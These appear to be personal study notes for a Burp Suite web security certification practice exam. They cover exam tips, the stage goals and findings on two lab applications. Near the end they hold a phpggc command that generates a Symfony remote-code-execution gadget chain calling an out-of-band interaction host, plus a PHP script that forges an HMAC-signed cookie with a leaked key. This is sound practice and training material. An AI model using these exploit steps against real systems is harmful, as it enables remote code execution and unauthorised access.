
ccshm3k076hwohb232l5wfqjmas1gr4g.oastify.com

If you find an SSRF vulnerability, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.

Scanning selected pages and insertion points with Burp Suite Professional will often help you quickly progress through the exam. Attempting a full application scan will not be feasible in the exam time frame. Some vulnerabilities are are very challenging to detect using only manual testing. If you get stuck, we highly recommend using Burp Scanner to help you tackle the problem.

1. If you're attacking the victim user, test the attack out on your own browser first. Pay close attention to the HTTP traffic sequence in Burp.
2. If your solution is adapted from an Academy lab, try to analyze how the application differs from the lab.
3. Try to identify any assumptions you're making, and put them to the test.
4. Refer back to [the skill set the certification aims to prove](https://portswigger.net/web-security/certification#what-does-a-burp-suite-certification-mean-for-me).


- **Stage 1:** Access any user account.
    There is always an administrator account with the username "**administrator**", plus a lower-privileged account usually called "**carlos**". If you find a username enumeration vulnerability, you may be able to break into a low-privileged account using the following [username list](https://portswigger.net/web-security/authentication/auth-lab-usernames) and [password list](https://portswigger.net/web-security/authentication/auth-lab-passwords).
- **Stage 2:** Use the compromised user account to access the admin interface, perhaps by elevating your privileges or compromising the administrator account.
    
- **Stage 3:** Use the admin interface to read the contents of /home/carlos/secret from the server's filesystem, and submit it using 'submit solution'.


# App1

- https://0a7b001d035c2056808f031f00bd0084.web-security-academy.net/
- https://exploit-0af100a603bb2059809b021f010600c6.exploit-server.net/
- No DOM-XSS on search
- Comments Disabled
- Probably once logged in, has /my_account_details page
- Trying Intruder with usernames payload shows that valid usernames produce a different message: Please check your email for a reset password link. This username is arcsight. Use Intruder with passwords payload to get credentials to log in. Make sure cookie and csrf token are correct
- 





# App2

- https://0a6600d703b6eabd84965008001a006e.web-security-academy.net
- https://exploit-0a7b006c0355ea3c84134f6d01200083.exploit-server.net/
- No DOM-XSS on search
- Comments enabled
- Possible Insecure Deserialisation %7b%22username%22%3anull%2c%22isloggedin%22%3afalse%7d--MCwCFEHhBnmx%2bGOyhk70XACyYRI%2fARiZAhQ0OWKzfaBkDByJmU%2bl%2bw5WzSqyVg%3d%3d; 
- Possible HTTP Request Smuggling Vulnerability


./phpggc Symfony/RCE4 exec 'dig ccshm3k076hwohb232l5wfqjmas1gr4g.oastify.com' | base64 -w 0

Create a PHP script: \<?php
  $object = "OBJECT-GENERATED-BY-PHPGGC";
  $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
  $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
  echo $cookie;
  
  php phpfile.php